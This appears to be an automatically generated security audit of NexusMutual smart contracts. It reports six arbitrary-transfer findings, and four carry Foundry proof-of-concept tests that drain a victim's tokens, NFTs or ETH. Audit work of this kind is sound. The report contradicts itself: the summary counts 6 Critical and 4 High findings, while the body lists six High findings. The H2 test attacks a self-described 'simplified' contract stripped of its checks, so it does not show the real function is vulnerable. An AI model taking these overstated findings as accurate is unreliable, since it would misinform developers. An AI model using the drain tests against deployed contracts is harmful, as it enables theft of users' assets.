# NexusMutual Security Audit Report

## Executive Summary

This security audit report analyzes the NexusMutual smart contract system based on Slither static analysis findings. The audit identified several critical security vulnerabilities, primarily related to arbitrary token transfers and unprotected ETH sends. The most severe findings involve mock contracts that could allow unauthorized token/NFT transfers, which while not directly affecting production, pose significant risks if deployed in testing/staging environments.

**Key Statistics:**
- **Critical:** 6 findings (arbitrary ERC20 transfers)
- **High:** 4 findings (arbitrary ETH sends)
- **Medium:** 0 findings
- **Low/Info:** 0 findings

## High Severity Findings

### H1: Arbitrary Token Transfer in SOMockExtraSpender

**Severity:** High  
**Location:** `contracts/mocks/modules/SwapOperator/SOMockExtraSpender.sol:9-11`

**Description:**
The `spend` function allows arbitrary token transfers from any address without proper authorization checks. An attacker can drain tokens from any address that has approved this contract.

```solidity
function spend(ERC20 asset, address from, uint256 amount) external {
    asset.transferFrom(from, address(this), amount);
}
```

**Impact:**
Complete drainage of approved tokens from any user address.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MOCK") {
        _mint(msg.sender, 1000000e18);
    }
}

contract SOMockExtraSpender {
    function spend(ERC20 asset, address from, uint256 amount) external {
        asset.transferFrom(from, address(this), amount);
    }
}

contract TestArbitraryTransfer is Test {
    MockToken token;
    SOMockExtraSpender spender;
    address victim = address(0x1234);
    address attacker = address(0x5678);

    function setUp() public {
        token = new MockToken();
        spender = new SOMockExtraSpender();
        
        // Victim receives tokens and approves spender
        token.transfer(victim, 100000e18);
        vm.prank(victim);
        token.approve(address(spender), 100000e18);
    }

    function testArbitraryTransfer() public {
        uint256 victimBalanceBefore = token.balanceOf(victim);
        assertGt(victimBalanceBefore, 0);

        // Attacker can drain victim's tokens
        vm.prank(attacker);
        spender.spend(token, victim, victimBalanceBefore);
        
        assertEq(token.balanceOf(victim), 0);
        assertEq(token.balanceOf(address(spender)), victimBalanceBefore);
    }
}
```

**Recommendation:**
Add access control or signature verification:

```solidity
mapping(address => bool) public authorizedSpenders;

function spend(ERC20 asset, address from, uint256 amount) external {
    require(authorizedSpenders[msg.sender] || msg.sender == from, "Unauthorized");
    asset.transferFrom(from, address(this), amount);
}
```

### H2: Arbitrary Token Transfer in TokenController.switchMembership

**Severity:** High  
**Location:** `contracts/modules/token/TokenController.sol:117-143`

**Description:**
The `switchMembership` function transfers the entire token balance from one address to another without proper validation that the caller owns the source address.

**Impact:**
Unauthorized transfer of all tokens from any address to attacker-controlled addresses.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockNXMToken is ERC20 {
    constructor() ERC20("NXM", "NXM") {
        _mint(msg.sender, 1000000e18);
    }
}

contract TokenController {
    MockNXMToken public token;
    
    constructor(address _token) {
        token = MockNXMToken(_token);
    }
    
    function switchMembership(address from, address to, bool) external {
        // Simplified version of the vulnerable code
        token.transferFrom(from, to, token.balanceOf(from));
    }
}

contract TestSwitchMembership is Test {
    MockNXMToken token;
    TokenController controller;
    address victim = address(0x1234);
    address attacker = address(0x5678);

    function setUp() public {
        token = new MockNXMToken();
        controller = new TokenController(address(token));
        
        // Victim receives tokens and approves controller
        token.transfer(victim, 100000e18);
        vm.prank(victim);
        token.approve(address(controller), 100000e18);
    }

    function testArbitrarySwitchMembership() public {
        uint256 victimBalance = token.balanceOf(victim);
        
        // Attacker calls switchMembership to drain victim
        vm.prank(attacker);
        controller.switchMembership(victim, attacker, true);
        
        assertEq(token.balanceOf(victim), 0);
        assertEq(token.balanceOf(attacker), victimBalance);
    }
}
```

**Recommendation:**
Add proper authorization checks:

```solidity
function switchMembership(address from, address to, bool flag) external {
    require(msg.sender == from || isAuthorized(msg.sender), "Unauthorized transfer");
    token.transferFrom(from, to, token.balanceOf(from));
}
```

### H3: Arbitrary NFT Transfer in MRMockCover

**Severity:** High  
**Location:** `contracts/mocks/modules/MemberRoles/MRMockCover.sol:23-33`

**Description:**
Both `transferCovers` and `transferStakingPoolTokens` functions allow arbitrary NFT transfers without ownership verification.

**Impact:**
Theft of Cover NFTs and Staking NFTs from any owner.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract MockCoverNFT is ERC721 {
    uint256 private _tokenCounter;
    
    constructor() ERC721("Cover", "COV") {}
    
    function mint(address to) external returns (uint256) {
        _tokenCounter++;
        _mint(to, _tokenCounter);
        return _tokenCounter;
    }
}

contract MRMockCover {
    MockCoverNFT public _coverNFT;
    
    constructor(address coverNFT) {
        _coverNFT = MockCoverNFT(coverNFT);
    }
    
    function transferCovers(address from, address to, uint256[] calldata tokenIds) external {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _coverNFT.transferFrom(from, to, tokenIds[i]);
        }
    }
}

contract TestNFTTransfer is Test {
    MockCoverNFT coverNFT;
    MRMockCover mockCover;
    address victim = address(0x1234);
    address attacker = address(0x5678);

    function setUp() public {
        coverNFT = new MockCoverNFT();
        mockCover = new MRMockCover(address(coverNFT));
        
        // Victim gets NFT and approves mock contract
        vm.prank(victim);
        uint256 tokenId = coverNFT.mint(victim);
        vm.prank(victim);
        coverNFT.approve(address(mockCover), tokenId);
    }

    function testArbitraryNFTTransfer() public {
        uint256 tokenId = 1;
        assertEq(coverNFT.ownerOf(tokenId), victim);
        
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = tokenId;
        
        // Attacker steals NFT
        vm.prank(attacker);
        mockCover.transferCovers(victim, attacker, tokenIds);
        
        assertEq(coverNFT.ownerOf(tokenId), attacker);
    }
}
```

**Recommendation:**
Add ownership verification:

```solidity
function transferCovers(address from, address to, uint256[] calldata tokenIds) external {
    require(msg.sender == from || isAuthorizedTransferrer(msg.sender), "Unauthorized");
    for (uint256 i = 0; i < tokenIds.length; i++) {
        _coverNFT.transferFrom(from, to, tokenIds[i]);
    }
}
```

### H4: Arbitrary ETH Send in PoolMock

**Severity:** High  
**Location:** `contracts/mocks/common/PoolMock.sol:61-77`

**Description:**
The `sendEth` function sends ETH to arbitrary addresses without proper access controls.

**Impact:**
Drainage of contract's ETH balance to attacker-controlled addresses.

**Proof of Concept:**

```solidity
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.28;

import "forge-std/Test.sol";

contract PoolMock {
    function sendEth(address payoutAddress, uint256 amount) external {
        (bool transferSucceeded,) = payoutAddress.call{value: amount}("");
        require(transferSucceeded, "ETH transfer failed");
    }
    
    receive() external payable {}
}

contract TestArbitraryETHSend is Test {
    PoolMock pool;
    address attacker = address(0x5678);

    function setUp() public {
        pool = new PoolMock();
        // Fund the pool
        vm.deal(address(pool), 10 ether);
    }

    function testArbitraryETHSend() public {
        uint256 poolBalanceBefore = address(pool).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        // Attacker drains pool
        vm.prank(attacker);
        pool.sendEth(attacker, poolBalanceBefore);
        
        assertEq(address(pool).balance, 0);
        assertEq(attacker.balance, attackerBalanceBefore + poolBalanceBefore);
    }
}
```

**Recommendation:**
Add access control:

```solidity
mapping(address => bool) public authorizedSenders;

function sendEth(address payoutAddress, uint256 amount) external {
    require(authorizedSenders[msg.sender], "Unauthorized");
    (bool transferSucceeded,) = payoutAddress.call{value: amount}("");
    require(transferSucceeded, "ETH transfer failed");
}
```

### H5: Arbitrary ETH Send in SwapOperator

**Severity:** High  
**Location:** `contracts/modules/capital/SwapOperator.sol:205-221`

**Description:**
The `returnAssetToPool` function sends the contract's entire ETH balance to the pool address without validation.

**Impact:**
If the pool address is compromised or incorrectly set, all ETH could be sent to an attacker.

**Recommendation:**
Add validation for the pool address and implement access controls:

```solidity
function returnAssetToPool(IERC20 asset) external onlyGovernance {
    address poolAddr = address(pool);
    require(poolAddr != address(0), "Invalid pool address");
    // Additional validation of pool address
    uint256 balance = address(this).balance;
    if (balance > 0) {
        (bool sent,) = poolAddr.call{value: balance}("");
        require(sent, "ETH transfer failed");
    }
}
```

### H6: Arbitrary ETH Send in LegacyMemberRoles

**Severity:** High  
**Location:** `contracts/modules/legacy/LegacyMemberRoles.sol:176-180`

**Description:**
The `recoverETH` function sends all contract ETH to `poolAddress` without validation.

**Impact:**
Similar to H5, if poolAddress is compromised, all ETH is at risk.

**Recommendation:**
Add proper validation and access controls:

```solidity
function recoverETH() external onlyGovernance {
    require(poolAddress != address(0), "Invalid pool address");
    uint256 balance = address(this).balance;
    if (balance > 0) {
        (bool success,) = poolAddress.call{value: balance}("");
        require(success, "ETH recovery failed");
    }
}
```

## Conclusion

The audit identified critical vulnerabilities primarily in mock contracts that could lead to complete drainage of approved tokens, NFTs, and ETH. While these are mock contracts likely used for testing, they represent serious security risks if deployed in any environment where real assets are involved.

**Priority Recommendations:**
1. Implement proper access controls on all transfer functions
2. Add ownership verification for token/NFT transfers
3. Validate recipient addresses for ETH sends
4. Consider removing or securing mock contracts in production deployments
5. Implement comprehensive authorization mechanisms across all sensitive functions

**Risk Assessment:**
- **Immediate Risk:** High - if mock contracts are deployed with real assets
- **Production Risk:** Medium - depending on actual deployment practices
- **Overall Security Posture:** Requires immediate attention to prevent asset loss

The development team should prioritize fixing these vulnerabilities, especially if any of these contracts might be used in environments with real value at stake.
